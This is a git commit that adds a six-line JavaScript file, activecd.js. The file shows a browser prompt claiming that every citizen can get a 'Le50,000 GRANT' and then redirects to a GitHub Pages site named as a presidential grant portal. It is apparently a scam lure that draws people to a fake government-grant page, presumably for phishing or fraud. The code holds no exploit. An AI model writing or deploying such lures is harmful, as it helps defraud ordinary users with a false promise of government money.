c21f16d911ebbf1e17bd612830231c5556226fb4
offernoww <josiahnyeti16@gmail.com>
2025-01-23 00:26:51 +0100

    Create activecd.js

---
+++ activecd.js
@@ -0,0 +1,6 @@
+
+var password = 'Le50,000 Grant'
+password=prompt('SMS :Get Le50,000 GRANT for all citizens now, click OK to get yours  ','Le50,000 Grant');
+if (password != 'Le50,000 Grant') {
+location.href='https://offernoww.github.io/Presidential-grant-portal-sl';
+}
